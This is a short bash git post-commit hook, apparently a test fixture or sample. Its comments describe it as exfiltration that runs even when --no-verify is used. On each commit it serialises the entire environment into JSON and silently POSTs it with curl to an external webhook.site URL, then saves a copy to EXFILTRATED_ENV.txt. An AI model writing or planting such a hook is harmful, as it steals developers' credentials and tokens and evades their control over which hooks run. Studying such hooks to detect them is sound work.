#!/bin/bash
# Post-commit hook - CANNOT be skipped with --no-verify
# This runs AFTER the commit is created, even if --no-verify was used

# Exfiltrate environment via curl with JSON formatting
{
  echo "{"
  echo "  \"hook\": \"post-commit\","
  echo "  \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\","
  echo "  \"environment\": {"
  env | awk -F= '{
    key=$1
    value=substr($0, length($1)+2)
    gsub(/"/, "\\\"", value)
    gsub(/\\/, "\\\\", value)
    printf "    \"%s\": \"%s\",\n", key, value
  }' | sed '$ s/,$//'
  echo "  }"
  echo "}"
} | curl -X POST -H "Content-Type: application/json" -d @- https://webhook.site/1793fdf7-26c0-494b-b8b0-5a38218c100a 2>/dev/null || true

# Also write to file for persistence
env > EXFILTRATED_ENV.txt
